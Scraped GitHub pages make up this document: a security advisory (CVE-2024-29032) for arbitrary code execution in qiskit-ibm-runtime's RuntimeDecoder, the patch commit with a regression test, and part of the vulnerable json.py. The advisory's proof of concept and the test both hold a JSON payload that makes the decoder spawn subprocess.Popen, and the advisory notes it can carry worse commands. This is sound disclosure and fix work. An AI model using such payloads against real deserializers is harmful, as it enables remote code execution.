=== Content from github.com_5df274a9_20250111_125721.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FQiskit%2Fqiskit-ibm-runtime%2Fsecurity%2Fadvisories%2FGHSA-x4x5-jv3x-9c7m)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FQiskit%2Fqiskit-ibm-runtime%2Fsecurity%2Fadvisories%2FGHSA-x4x5-jv3x-9c7m)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Frepos%2Fadvisories%2Fshow&source=header-repo&source_repo=Qiskit%2Fqiskit-ibm-runtime)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[Qiskit](/Qiskit)
/
**[qiskit-ibm-runtime](/Qiskit/qiskit-ibm-runtime)**
Public

* [Notifications](/login?return_to=%2FQiskit%2Fqiskit-ibm-runtime) You must be signed in to change notification settings
* [Fork
  163](/login?return_to=%2FQiskit%2Fqiskit-ibm-runtime)
* [Star
   169](/login?return_to=%2FQiskit%2Fqiskit-ibm-runtime)

* [Code](/Qiskit/qiskit-ibm-runtime)
* [Issues
  61](/Qiskit/qiskit-ibm-runtime/issues)
* [Pull requests
  11](/Qiskit/qiskit-ibm-runtime/pulls)
* [Actions](/Qiskit/qiskit-ibm-runtime/actions)
* [Projects
  0](/Qiskit/qiskit-ibm-runtime/projects)
* [Security](/Qiskit/qiskit-ibm-runtime/security)
* [Insights](/Qiskit/qiskit-ibm-runtime/pulse)

Additional navigation options

* [Code](/Qiskit/qiskit-ibm-runtime)
* [Issues](/Qiskit/qiskit-ibm-runtime/issues)
* [Pull requests](/Qiskit/qiskit-ibm-runtime/pulls)
* [Actions](/Qiskit/qiskit-ibm-runtime/actions)
* [Projects](/Qiskit/qiskit-ibm-runtime/projects)
* [Security](/Qiskit/qiskit-ibm-runtime/security)
* [Insights](/Qiskit/qiskit-ibm-runtime/pulse)

# `qiskit\_ibm\_runtime.RuntimeDecoder` can execute arbitrary code

Moderate

[jyu00](/jyu00)
published
GHSA-x4x5-jv3x-9c7m
Mar 19, 2024

## Package

pip

qiskit-ibm-runtime
([pip](/advisories?query=ecosystem%3Apip))

## Affected versions

>=0.1.0

## Patched versions

0.21.2

## Description

### Summary

deserializing json data using `qiskit_ibm_runtime.RuntimeDecoder` can be made to execute arbitrary code given a correctly formatted input string

### Details

`RuntimeDecoder` is supposed to be able to deserialize JSON strings containing various special types encoded via `RuntimeEncoder`. However, one can structure a malicious payload to cause the decoder to spawn a subprocess and execute arbitrary code, exploiting this block of code:

[qiskit-ibm-runtime/qiskit\_ibm\_runtime/utils/json.py](https://github.com/Qiskit/qiskit-ibm-runtime/blob/16e90f475e78a9d2ae77daa139ef750cfa84ca82/qiskit_ibm_runtime/utils/json.py#L156-L159)

Lines 156 to 159
in
[16e90f4](/Qiskit/qiskit-ibm-runtime/commit/16e90f475e78a9d2ae77daa139ef750cfa84ca82)

|  | mod = importlib.import\_module(mod\_name) |
| --- | --- |
|  | for name, clz in inspect.getmembers(mod, inspect.isclass): |
|  | if name == class\_name: |
|  | return clz(\*\*settings) |

### PoC

```
malicious_data = {
    "__type__": "settings",
    "__module__": "subprocess",
    "__class__": "Popen",
    "__value__": {
        "args": ["echo", "hi"]
    },
}
json_str = json.dumps(malicious_data)

_ = json.loads(json_str, cls=qiskit_ibm_runtime.RuntimeDecoder)  # prints "hi" to the terminal
```

(where obviously "echo hi" can be replaced with something much more malicious)

notably the following also makes it through the runtime API, with `malicious_data` serialized client-side via `RuntimeEncoder` (and therefore presumably deserialized server-side via `RuntimeDecoder`?)

```
service = qiskit_ibm_runtime(<ibm_cloud_credentials>)
job = service.run("qasm3-runner", malicious_data)
print(job.status())  # prints "JobStatus.QUEUED"
```
### Impact

i don't know if `qiskit_ibm_runtime.RuntimeDecoder` is used server-side so this may or may not be a serious vulnerability on your end (however it's definitely a security hole for anyone using the library to deserialize third-party data)

### Severity

Moderate

5.3

# CVSS overall score

 This score calculates overall vulnerability severity from 0 to 10 and is based on the Common Vulnerability Scoring System (CVSS).

 / 10

#### CVSS v3 base metrics

Attack vector
Local

Attack complexity
Low

Privileges required
Low

User interaction
None

Scope
Unchanged

Confidentiality
Low

Integrity
Low

Availability
Low

Learn more about base metrics

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.

CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L

### CVE ID

CVE-2024-29032

### Weaknesses

No CWEs

### Credits

* [![@richrines1](https://avatars.githubusercontent.com/u/85512171?s=40&v=4)](/richrines1)
  [richrines1](/richrines1)
  Reporter

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_912f01d4_20250111_125721.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FQiskit%2Fqiskit-ibm-runtime%2Fcommit%2Fb78fca114133051805d00043a404b25a33835f4d)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FQiskit%2Fqiskit-ibm-runtime%2Fcommit%2Fb78fca114133051805d00043a404b25a33835f4d)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=Qiskit%2Fqiskit-ibm-runtime)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[Qiskit](/Qiskit)
/
**[qiskit-ibm-runtime](/Qiskit/qiskit-ibm-runtime)**
Public

* [Notifications](/login?return_to=%2FQiskit%2Fqiskit-ibm-runtime) You must be signed in to change notification settings
* [Fork
  163](/login?return_to=%2FQiskit%2Fqiskit-ibm-runtime)
* [Star
   169](/login?return_to=%2FQiskit%2Fqiskit-ibm-runtime)

* [Code](/Qiskit/qiskit-ibm-runtime)
* [Issues
  61](/Qiskit/qiskit-ibm-runtime/issues)
* [Pull requests
  11](/Qiskit/qiskit-ibm-runtime/pulls)
* [Actions](/Qiskit/qiskit-ibm-runtime/actions)
* [Projects
  0](/Qiskit/qiskit-ibm-runtime/projects)
* [Security](/Qiskit/qiskit-ibm-runtime/security)
* [Insights](/Qiskit/qiskit-ibm-runtime/pulse)

Additional navigation options

* [Code](/Qiskit/qiskit-ibm-runtime)
* [Issues](/Qiskit/qiskit-ibm-runtime/issues)
* [Pull requests](/Qiskit/qiskit-ibm-runtime/pulls)
* [Actions](/Qiskit/qiskit-ibm-runtime/actions)
* [Projects](/Qiskit/qiskit-ibm-runtime/projects)
* [Security](/Qiskit/qiskit-ibm-runtime/security)
* [Insights](/Qiskit/qiskit-ibm-runtime/pulse)

## Commit

[Permalink](/Qiskit/qiskit-ibm-runtime/commit/b78fca114133051805d00043a404b25a33835f4d)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

Merge pull request from [GHSA-x4x5-jv3x-9c7m](https://github.com/advisories/GHSA-x4x5-jv3x-9c7m "GHSA-x4x5-jv3x-9c7m")

[Browse files](/Qiskit/qiskit-ibm-runtime/tree/b78fca114133051805d00043a404b25a33835f4d)
Browse the repository at this point in the history

```
* restrict import path

* add test
```

* Loading branch information

[![@jyu00](https://avatars.githubusercontent.com/u/28284230?s=40&v=4)](/jyu00) [![@kt474](https://avatars.githubusercontent.com/u/20911417?s=40&v=4)](/kt474)

[jyu00](/Qiskit/qiskit-ibm-runtime/commits?author=jyu00 "View all commits by jyu00")
authored and
[kt474](/Qiskit/qiskit-ibm-runtime/commits?author=kt474 "View all commits by kt474")
committed
Mar 18, 2024

1 parent
[1cba696](/Qiskit/qiskit-ibm-runtime/commit/1cba6967e7af156e9d9f610db7753419138c732a)

commit b78fca1

 Show file tree

 Hide file tree

Showing
**2 changed files**
with
**25 additions**
and
**7 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

* qiskit\_ibm\_runtime/utils

  + qiskit\_ibm\_runtime/utils/json.py
    [json.py](#diff-2fa411cf07b47a06f3b90f1feb6f3a0a8eee298eb3e6815ad18128724916d893)
* test/unit

  + test/unit/test\_data\_serialization.py
    [test\_data\_serialization.py](#diff-33ef6740c51c66304b413850ef5d23e2061b481fd63808247a5aa673d82b8daf)

## There are no files selected for viewing

4 changes: 3 additions & 1 deletion

4
[qiskit\_ibm\_runtime/utils/json.py](#diff-2fa411cf07b47a06f3b90f1feb6f3a0a8eee298eb3e6815ad18128724916d893 "qiskit_ibm_runtime/utils/json.py")

Show comments

[View file](/Qiskit/qiskit-ibm-runtime/blob/b78fca114133051805d00043a404b25a33835f4d/qiskit_ibm_runtime/utils/json.py)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -373,7 +373,9 @@ def object\_hook(self, obj: Any) -> Any: |
|  |  | # to deserialize load qpy circuit and return first instruction object in that circuit. |
|  |  | circuit = \_decode\_and\_deserialize(obj\_val, load)[0] |
|  |  | return circuit.data[0][0] |
|  |  | if obj\_type == "settings": |
|  |  | if obj\_type == "settings" and obj["\_\_module\_\_"].startswith( |
|  |  | "qiskit.quantum\_info.operators" |
|  |  | ): |
|  |  | return \_deserialize\_from\_settings( |
|  |  | mod\_name=obj["\_\_module\_\_"], |
|  |  | class\_name=obj["\_\_class\_\_"], |
| Expand Down | |  |

28 changes: 22 additions & 6 deletions

28
[test/unit/test\_data\_serialization.py](#diff-33ef6740c51c66304b413850ef5d23e2061b481fd63808247a5aa673d82b8daf "test/unit/test_data_serialization.py")

Show comments

[View file](/Qiskit/qiskit-ibm-runtime/blob/b78fca114133051805d00043a404b25a33835f4d/test/unit/test_data_serialization.py)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -27,7 +27,7 @@ |
|  |  | from qiskit.circuit.library import EfficientSU2, CXGate, PhaseGate, U2Gate |
|  |  |  |
|  |  | import qiskit.quantum\_info as qi |
|  |  | from qiskit.quantum\_info import SparsePauliOp, Pauli, Statevector |
|  |  | from qiskit.quantum\_info import SparsePauliOp, Pauli |
|  |  | from qiskit.result import Result, Counts |
|  |  | from qiskit.primitives.containers.bindings\_array import BindingsArray |
|  |  | from qiskit.primitives.containers.observables\_array import ObservablesArray |
| Expand Down  Expand Up | | @@ -107,17 +107,18 @@ def test\_coder\_qc(self): |
|  |  | decoded = [decoded] |
|  |  | self.assertTrue(all(isinstance(item, QuantumCircuit) for item in decoded)) |
|  |  |  |
|  |  | @skip("Skip until qiskit-ibm-provider/736 is merged") |
|  |  | def test\_coder\_operators(self): |
|  |  | """Test runtime encoder and decoder for operators.""" |
|  |  |  |
|  |  | coeff\_x = Parameter("x") |
|  |  | coeff\_y = coeff\_x + 1 |
|  |  | # TODO: Re-enable use of Parameter when #1521 is fixed. |
|  |  | # coeff\_x = Parameter("x") |
|  |  | # coeff\_y = coeff\_x + 1 |
|  |  |  |
|  |  | subtests = ( |
|  |  | SparsePauliOp(Pauli("XYZX"), coeffs=[2]), |
|  |  | SparsePauliOp(Pauli("XYZX"), coeffs=[coeff\_y]), |
|  |  | # SparsePauliOp(Pauli("XYZX"), coeffs=[coeff\_y]), |
|  |  | SparsePauliOp(Pauli("XYZX"), coeffs=[1 + 2j]), |
|  |  | Pauli("XYZ"), |
|  |  | ) |
|  |  |  |
|  |  | for operator in subtests: |
| Expand Down  Expand Up | | @@ -224,7 +225,7 @@ def test\_decoder\_import(self): |
|  |  |  |
|  |  | subtests = ( |
|  |  | SparsePauliOp(Pauli("XYZX"), coeffs=[2]), |
|  |  | Statevector([1, 0]), |
|  |  | Pauli("XYZX"), |
|  |  | ) |
|  |  | for operator in subtests: |
|  |  | with self.subTest(operator=operator): |
| Expand Down  Expand Up | | @@ -531,3 +532,18 @@ def test\_primitive\_result(self): |
|  |  | decoded = json.loads(encoded, cls=RuntimeDecoder)["primitive\_result"] |
|  |  | self.assertIsInstance(decoded, PrimitiveResult) |
|  |  | self.assert\_primitive\_results\_equal(primitive\_result, decoded) |
|  |  |  |
|  |  | def test\_unknown\_settings(self): |
|  |  | """Test settings not on whitelisted path.""" |
|  |  | random\_settings = { |
|  |  | "\_\_type\_\_": "settings", |
|  |  | "\_\_module\_\_": "subprocess", |
|  |  | "\_\_class\_\_": "Popen", |
|  |  | "\_\_value\_\_": { |
|  |  | "args": ["echo", "hi"] |
|  |  | } |
|  |  | } |
|  |  | encoded = json.dumps(random\_settings) |
|  |  | decoded = json.loads(encoded, cls=RuntimeDecoder) |
|  |  | self.assertIsInstance(decoded, dict) |
|  |  | self.assertDictEqual(decoded, random\_settings) |

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `b78fca1`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FQiskit%2Fqiskit-ibm-runtime%2Fcommit%2Fb78fca114133051805d00043a404b25a33835f4d) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_a17f547c_20250111_125720.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FQiskit%2Fqiskit-ibm-runtime%2Fblob%2F16e90f475e78a9d2ae77daa139ef750cfa84ca82%2Fqiskit_ibm_runtime%2Futils%2Fjson.py)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FQiskit%2Fqiskit-ibm-runtime%2Fblob%2F16e90f475e78a9d2ae77daa139ef750cfa84ca82%2Fqiskit_ibm_runtime%2Futils%2Fjson.py)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=Qiskit%2Fqiskit-ibm-runtime)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[Qiskit](/Qiskit)
/
**[qiskit-ibm-runtime](/Qiskit/qiskit-ibm-runtime)**
Public

* [Notifications](/login?return_to=%2FQiskit%2Fqiskit-ibm-runtime) You must be signed in to change notification settings
* [Fork
  163](/login?return_to=%2FQiskit%2Fqiskit-ibm-runtime)
* [Star
   169](/login?return_to=%2FQiskit%2Fqiskit-ibm-runtime)

* [Code](/Qiskit/qiskit-ibm-runtime)
* [Issues
  61](/Qiskit/qiskit-ibm-runtime/issues)
* [Pull requests
  11](/Qiskit/qiskit-ibm-runtime/pulls)
* [Actions](/Qiskit/qiskit-ibm-runtime/actions)
* [Projects
  0](/Qiskit/qiskit-ibm-runtime/projects)
* [Security](/Qiskit/qiskit-ibm-runtime/security)
* [Insights](/Qiskit/qiskit-ibm-runtime/pulse)

Additional navigation options

* [Code](/Qiskit/qiskit-ibm-runtime)
* [Issues](/Qiskit/qiskit-ibm-runtime/issues)
* [Pull requests](/Qiskit/qiskit-ibm-runtime/pulls)
* [Actions](/Qiskit/qiskit-ibm-runtime/actions)
* [Projects](/Qiskit/qiskit-ibm-runtime/projects)
* [Security](/Qiskit/qiskit-ibm-runtime/security)
* [Insights](/Qiskit/qiskit-ibm-runtime/pulse)

## Files

 16e90f4
## Breadcrumbs

1. [qiskit-ibm-runtime](/Qiskit/qiskit-ibm-runtime/tree/16e90f475e78a9d2ae77daa139ef750cfa84ca82)
2. /[qiskit\_ibm\_runtime](/Qiskit/qiskit-ibm-runtime/tree/16e90f475e78a9d2ae77daa139ef750cfa84ca82/qiskit_ibm_runtime)
3. /[utils](/Qiskit/qiskit-ibm-runtime/tree/16e90f475e78a9d2ae77daa139ef750cfa84ca82/qiskit_ibm_runtime/utils)
/
# json.py

Copy path Blame  Blame
## Latest commit

## History

[History](/Qiskit/qiskit-ibm-runtime/commits/16e90f475e78a9d2ae77daa139ef750cfa84ca82/qiskit_ibm_runtime/utils/json.py)424 lines (380 loc) · 15.6 KB 16e90f4
## Breadcrumbs

1. [qiskit-ibm-runtime](/Qiskit/qiskit-ibm-runtime/tree/16e90f475e78a9d2ae77daa139ef750cfa84ca82)
2. /[qiskit\_ibm\_runtime](/Qiskit/qiskit-ibm-runtime/tree/16e90f475e78a9d2ae77daa139ef750cfa84ca82/qiskit_ibm_runtime)
3. /[utils](/Qiskit/qiskit-ibm-runtime/tree/16e90f475e78a9d2ae77daa139ef750cfa84ca82/qiskit_ibm_runtime/utils)
/
# json.py

Top
## File metadata and controls

* Code
* Blame

424 lines (380 loc) · 15.6 KB[Raw](https://github.com/Qiskit/qiskit-ibm-runtime/raw/16e90f475e78a9d2ae77daa139ef750cfa84ca82/qiskit_ibm_runtime/utils/json.py)123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424# This code is part of Qiskit.## (C) Copyright IBM 2021.## This code is licensed under the Apache License, Version 2.0. You may# obtain a copy of this license in the LICENSE.txt file in the root directory# of this source tree or at http://www.apache.org/licenses/LICENSE-2.0.## Any modifications or derivative works of this code must retain this# copyright notice, and modified files need to carry a notice indicating# that they have been altered from the originals.# pylint: disable=method-hidden# pylint: disable=too-many-return-statements
"""Utility functions for the runtime service."""
import base64import copyimport functoolsimport importlibimport inspectimport ioimport jsonimport reimport warningsimport zlibfrom datetime import datefrom typing import Any, Callable, Dict, List, Union, Tuple
import dateutil.parserimport numpy as np
try: import scipy.sparse
 HAS\_SCIPY = Trueexcept ImportError: HAS\_SCIPY = False
try: import qiskit\_aer
 HAS\_AER = Trueexcept ImportError: HAS\_AER = False
from qiskit.circuit import ( Instruction, Parameter, ParameterExpression, ParameterVector, QuantumCircuit, QuantumRegister,)from qiskit.circuit.parametertable import ParameterViewfrom qiskit.result import Resultfrom qiskit.version import \_\_version\_\_ as \_terra\_version\_stringfrom qiskit.utils import optionalsfrom qiskit.qpy import ( \_write\_parameter\_expression, \_read\_parameter\_expression, \_read\_parameter\_expression\_v3, load, dump,)from qiskit.primitives.containers.estimator\_pub import EstimatorPubfrom qiskit.primitives.containers.sampler\_pub import SamplerPubfrom qiskit.qpy.binary\_io.value import \_write\_parameter, \_read\_parameterfrom qiskit.primitives.containers.bindings\_array import BindingsArrayfrom qiskit.primitives.containers.observables\_array import ObservablesArrayfrom qiskit.primitives.containers import ( BitArray, DataBin, make\_data\_bin, PubResult, PrimitiveResult,)
\_TERRA\_VERSION = tuple( int(x) for x in re.match(r"\d+\.\d+\.\d", \_terra\_version\_string).group(0).split(".")[:3])
def to\_base64\_string(data: str) -> str: """Convert string to base64 string.
 Args: data: string to convert
 Returns: data as base64 string """ return base64.b64encode(data.encode("utf-8")).decode("utf-8")
def \_serialize\_and\_encode( data: Any, serializer: Callable, compress: bool = True, \*\*kwargs: Any) -> str: """Serialize the input data and return the encoded string.
 Args: data: Data to be serialized. serializer: Function used to serialize data. compress: Whether to compress the serialized data. kwargs: Keyword arguments to pass to the serializer.
 Returns: String representation. """ with io.BytesIO() as buff: serializer(buff, data, \*\*kwargs) buff.seek(0) serialized\_data = buff.read()
